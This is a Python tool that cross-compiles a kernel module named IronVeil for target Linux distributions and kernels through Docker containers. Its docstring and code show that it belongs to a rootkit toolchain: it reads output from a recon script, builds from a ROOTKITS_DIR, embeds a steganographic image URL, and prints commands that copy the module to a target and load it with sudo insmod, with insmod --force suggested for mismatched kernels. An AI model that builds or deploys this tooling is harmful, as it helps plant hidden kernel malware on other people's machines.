#!/usr/bin/env python3
"""
IronVeil Modular Compiler (ironveil_compiler.py) — Cipherfall cross-kernel .ko builder

What it does:
  Takes the output of Phantom Eye (recon script) or explicit --distro/--kernel args,
  then cross-compiles IronVeil (ironveil.c) into a .ko loadable on the target kernel.
  Runs a per-distro Docker container, installs the matching kernel headers inside,
  compiles against them, and exports the .ko via a volume mount.

Techniques:
  - Parses Phantom Eye semicolon-delimited line: fields 0=Distro, 1=Version, 2=Kernel
  - Strategy pattern: one BuildStrategy subclass per distro family, resolved from
    a STRATEGIES dict keyed on lower-case distro name substring
  - Docker ephemeral containers (--rm): pulls the right base image, installs headers
    matching uname -r, runs make KDIR=<headers_path> M=/tmp/build modules, copies .ko out
  - Distro families implemented:
      DebianUbuntu — apt linux-headers-<kernel> on ubuntu:* / debian:* / kali / parrot
      Arch         — pacman linux-headers on archlinux:latest (version-magic caveat)
      RHEL         — dnf kernel-devel on fedora:* / almalinux:* / centos:* / rockylinux:*
      DSM          — raises NotImplementedError; Synology toolkit required (see message)
  - For Ubuntu/Debian EOL kernels: falls back to archive.ubuntu.com + old-releases repos
  - Makefile KDIR is always passed explicitly (avoids uname -r resolution inside container)

Limitations:
  - Requires Docker on the operator machine (docker CLI + daemon).
  - Ubuntu/Debian: headers for kernels dropped from all repos (and not in archive) will
    fail; very old EOL kernels may need manual intervention.
  - Arch: archlinux:latest only has the current rolling-release kernel headers. If the
    target Arch system runs an older kernel, version magic will mismatch and insmod will
    refuse the .ko. Workaround: insmod --force on target (degrades safety checks).
  - RHEL/Fedora: dnf pulls the current kernel-devel, not a specific version. Same
    version-magic caveat as Arch for non-current kernels.
  - Cross-architecture not supported; assumes x86_64 host == x86_64 target.
  - DSM kernels (4.4.302+) require the Synology DSM Toolkit, not a standard distro image.
  - The compiled .ko embeds the build-time STEGO_IMG_URL / PYTHON3_PATH constants from
    ironveil.c; update those before compiling for a different target.

Usage:
  # From Phantom Eye output line:
  python3 ironveil_compiler.py "Ubuntu;22.04;5.15.0-112-generic;N/A;..."

  # Explicit args:
  python3 ironveil_compiler.py --distro Debian --version 12 --kernel 6.1.0-49-amd64
  python3 ironveil_compiler.py --distro Arch   --kernel 7.0.11-arch1-1
  python3 ironveil_compiler.py --distro Fedora --version 40 --kernel 6.9.7-200.fc40.x86_64

  # Custom output directory:
  python3 ironveil_compiler.py --distro Ubuntu --version 22.04 --kernel 5.15.0-112-generic --output /tmp/built
"""

import sys
import os
import subprocess
import argparse
from pathlib import Path
from abc import ABC, abstractmethod

ROOTKITS_DIR = Path(__file__).parent.resolve()


def parse_phantom_eye(line: str) -> tuple[str, str, str]:
    parts = line.strip().split(";")
    if len(parts) < 3:
        raise ValueError(f"expected ≥3 semicolon-separated fields, got {len(parts)}")
    distro, version, kernel = parts[0], parts[1], parts[2]
    for field, name in [(distro, "Distro"), (kernel, "Kernel")]:
        if field in ("N/A", ""):
            raise ValueError(f"{name} field is '{field}' — recon may be incomplete")
    return distro, version, kernel


def check_docker() -> None:
    try:
        subprocess.run(["docker", "info"], capture_output=True, check=True)
    except FileNotFoundError:
        sys.exit("[!] docker not found in PATH — install Docker and retry")
    except subprocess.CalledProcessError:
        sys.exit("[!] Docker daemon not running — start it and retry")


class BuildStrategy(ABC):
    def __init__(self, distro: str, version: str, kernel: str) -> None:
        self.distro = distro
        self.version = version
        self.kernel = kernel

    @abstractmethod
    def build(self, src_dir: Path, output_dir: Path) -> bool: ...

    def _docker_run(self, image: str, src_dir: Path, output_dir: Path, script: str) -> bool:
        print(f"[*] Image : {image}")
        print(f"[*] Kernel: {self.kernel}")
        cmd = [
            "docker", "run", "--rm",
            "-v", f"{src_dir}:/src:ro",
            "-v", f"{output_dir}:/output",
            image,
            "/bin/sh", "-ec", script,
        ]
        return subprocess.run(cmd).returncode == 0


class DebianUbuntuStrategy(BuildStrategy):
    _UBUNTU_TAGS = {
        "18.04": "bionic", "20.04": "focal", "22.04": "jammy",
        "24.04": "noble", "24.10": "oracular",
    }
    _DEBIAN_TAGS = {
        "10": "buster", "11": "bullseye", "12": "bookworm", "13": "trixie",
    }

    def _image(self) -> str:
        d = self.distro.lower()
        if "ubuntu" in d:
            tag = self._UBUNTU_TAGS.get(self.version, self.version)
            return f"ubuntu:{tag}"
        if "kali" in d:
            return "kalilinux/kali-rolling"
        if "parrot" in d:
            return "parrotsec/core-amd64:latest"
        ver = self.version.split(".")[0]
        tag = self._DEBIAN_TAGS.get(ver, ver)
        return f"debian:{tag}"

    def build(self, src_dir: Path, output_dir: Path) -> bool:
        image = self._image()
        hpkg = f"linux-headers-{self.kernel}"
        out_ko = f"ironveil_{self.kernel}.ko"
        script = f"""
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y --no-install-recommends build-essential {hpkg} 2>/dev/null || {{
    CODENAME=$(. /etc/os-release 2>/dev/null && echo "$VERSION_CODENAME" || echo "")
    if [ -n "$CODENAME" ]; then
        cat >> /etc/apt/sources.list <<SRCEOF
deb http://archive.ubuntu.com/ubuntu/ $CODENAME main restricted universe
deb http://archive.ubuntu.com/ubuntu/ $CODENAME-updates main restricted universe
deb http://archive.ubuntu.com/ubuntu/ $CODENAME-security main restricted universe
deb http://old-releases.ubuntu.com/ubuntu/ $CODENAME main restricted universe
SRCEOF
    fi
    apt-get update -qq
    apt-get install -y --no-install-recommends build-essential {hpkg}
}}
HD=$(ls -d /usr/src/linux-headers-{self.kernel} 2>/dev/null | head -1)
[ -z "$HD" ] && HD=$(ls -d /usr/src/linux-headers-{self.kernel}* 2>/dev/null | grep -v common | head -1)
[ -z "$HD" ] && {{ echo "[!] headers dir not found for {self.kernel}"; exit 1; }}
cp -r /src /tmp/build
cd /tmp/build
make KDIR="$HD"
cp ironveil.ko /output/{out_ko}
echo "[+] {out_ko}"
"""
        return self._docker_run(image, src_dir, output_dir, script)


class ArchStrategy(BuildStrategy):
    def build(self, src_dir: Path, output_dir: Path) -> bool:
        out_ko = f"ironveil_{self.kernel}.ko"
        script = f"""
pacman -Sy --noconfirm --needed base-devel linux-headers 2>/dev/null
HD=$(ls -d /usr/lib/modules/*/build 2>/dev/null | head -1)
[ -z "$HD" ] && HD=$(ls -d /usr/src/linux-* 2>/dev/null | head -1)
[ -z "$HD" ] && {{ echo "[!] no kernel headers found"; exit 1; }}
INSTALLED_VER=$(basename $(dirname "$HD"))
if [ "$INSTALLED_VER" != "{self.kernel}" ]; then
    echo "[!] WARNING: installed headers ($INSTALLED_VER) differ from target ({self.kernel})"
    echo "[!] Version magic mismatch — use insmod --force on target if load fails"
fi
cp -r /src /tmp/build
cd /tmp/build
make KDIR="$HD"
cp ironveil.ko /output/{out_ko}
echo "[+] {out_ko}"
"""
        return self._docker_run("archlinux:latest", src_dir, output_dir, script)


class RHELStrategy(BuildStrategy):
    def _image(self) -> str:
        d = self.distro.lower()
        if "fedora" in d:
            return f"fedora:{self.version}" if self.version else "fedora:latest"
        if "centos" in d:
            ver = self.version.split(".")[0]
            return f"centos:{ver}" if ver and int(ver) < 8 else "almalinux:8"
        if "rocky" in d:
            return f"rockylinux:{self.version}" if self.version else "rockylinux:9"
        ver = self.version.split(".")[0]
        return f"almalinux:{ver}" if ver else "almalinux:9"

    def build(self, src_dir: Path, output_dir: Path) -> bool:
        image = self._image()
        out_ko = f"ironveil_{self.kernel}.ko"
        script = f"""
dnf install -y --quiet gcc make elfutils-libelf-devel kernel-devel 2>/dev/null || \
    yum install -y gcc make elfutils-libelf-devel kernel-devel
HD=$(ls -d /usr/src/kernels/{self.kernel} 2>/dev/null | head -1)
[ -z "$HD" ] && HD=$(ls -d /usr/src/kernels/{self.kernel}* 2>/dev/null | head -1)
[ -z "$HD" ] && HD=$(ls -d /usr/src/kernels/* 2>/dev/null | tail -1)
[ -z "$HD" ] && {{ echo "[!] no kernel headers found"; exit 1; }}
cp -r /src /tmp/build
cd /tmp/build
make KDIR="$HD"
cp ironveil.ko /output/{out_ko}
echo "[+] {out_ko}"
"""
        return self._docker_run(image, src_dir, output_dir, script)


class DSMStrategy(BuildStrategy):
    def build(self, src_dir: Path, output_dir: Path) -> bool:
        raise NotImplementedError(
            "DSM cross-compilation requires the Synology DSM Toolkit.\n"
            "  1. Download toolkit: https://global.synology.com/support/download\n"
            "     Select your model (e.g. DS918+) → DSM 7.2 → Developer Toolkit.\n"
            "  2. Extract and locate the kernel source under ds.<platform>-<ver>/\n"
            "  3. Build:\n"
            "       KDIR=<toolkit>/ds.broadwellnk-7.2/usr/x86_64-pc-linux-gnu/sys-root/\n"
            "       make -C $KDIR M=$(pwd) ARCH=x86_64 modules\n"
            "  DSM 7.2.2 platform identifiers: broadwellnk (DS918+/920+/923+), "
            "avoton (RS815+), geminilake (DS420+)."
        )


STRATEGIES: dict[str, type[BuildStrategy]] = {
    "ubuntu":     DebianUbuntuStrategy,
    "debian":     DebianUbuntuStrategy,
    "kali":       DebianUbuntuStrategy,
    "parrot":     DebianUbuntuStrategy,
    "mint":       DebianUbuntuStrategy,
    "raspbian":   DebianUbuntuStrategy,
    "elementary": DebianUbuntuStrategy,
    "pop":        DebianUbuntuStrategy,
    "arch":       ArchStrategy,
    "manjaro":    ArchStrategy,
    "endeavour":  ArchStrategy,
    "garuda":     ArchStrategy,
    "fedora":     RHELStrategy,
    "centos":     RHELStrategy,
    "rhel":       RHELStrategy,
    "red hat":    RHELStrategy,
    "almalinux":  RHELStrategy,
    "rocky":      RHELStrategy,
    "oracle":     RHELStrategy,
    "synology":   DSMStrategy,
    "dsm":        DSMStrategy,
}


def get_strategy(distro: str, version: str, kernel: str) -> BuildStrategy:
    dl = distro.lower()
    for key, cls in STRATEGIES.items():
        if key in dl:
            return cls(distro, version, kernel)
    print(f"[!] Unknown distro '{distro}', defaulting to Debian/Ubuntu strategy")
    return DebianUbuntuStrategy(distro, version, kernel)


def main() -> None:
    ap = argparse.ArgumentParser(
        description="Cross-compile IronVeil .ko for a target kernel via Docker"
    )
    ap.add_argument("phantom_eye", nargs="?",
                    help="Phantom Eye output line (Distro;Version;Kernel;...)")
    ap.add_argument("--distro",   help="Target distro (e.g. Ubuntu, Debian, Arch, Fedora)")
    ap.add_argument("--version",  default="",
                    help="Distro version (e.g. 22.04, 12, 40) — optional for some strategies")
    ap.add_argument("--kernel",   help="uname -r string (e.g. 5.15.0-112-generic)")
    ap.add_argument("--output",   default=".",
                    help="Output directory for the compiled .ko (default: current dir)")
    args = ap.parse_args()

    if args.phantom_eye:
        distro, version, kernel = parse_phantom_eye(args.phantom_eye)
    elif args.distro and args.kernel:
        distro, version, kernel = args.distro, args.version, args.kernel
    else:
        ap.print_help()
        sys.exit(1)

    print(f"[*] Distro : {distro} {version}")
    print(f"[*] Kernel : {kernel}")

    check_docker()

    strategy = get_strategy(distro, version, kernel)
    output_dir = Path(args.output).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    try:
        ok = strategy.build(ROOTKITS_DIR, output_dir)
    except NotImplementedError as e:
        sys.exit(f"[!] {e}")

    ko = output_dir / f"ironveil_{kernel}.ko"
    if ok and ko.exists():
        print(f"\n[+] Output : {ko}")
        print(f"[+] Size   : {ko.stat().st_size} bytes")
        print(f"\n    Deploy : scp {ko} user@target:/tmp/")
        print(f"             ssh user@target 'sudo insmod /tmp/{ko.name}'")
    else:
        sys.exit("\n[!] Build failed — see Docker output above for details")


if __name__ == "__main__":
    main()
